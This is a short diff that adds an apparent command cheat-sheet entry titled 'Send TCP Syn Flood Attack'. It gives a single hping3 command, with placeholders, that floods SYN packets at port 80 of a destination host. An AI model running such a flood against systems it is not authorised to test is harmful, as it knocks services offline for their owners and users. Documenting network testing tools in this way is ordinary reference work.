@@ -1,0 +1,6 @@
+# Send TCP Syn Flood Attack
+
+# TCP Syn flood attack using <tons> packets in destination <dest>
+hping3 -c <tons = 10> -S -p 80 --flood <dest = 192.168.0.1>
+
+
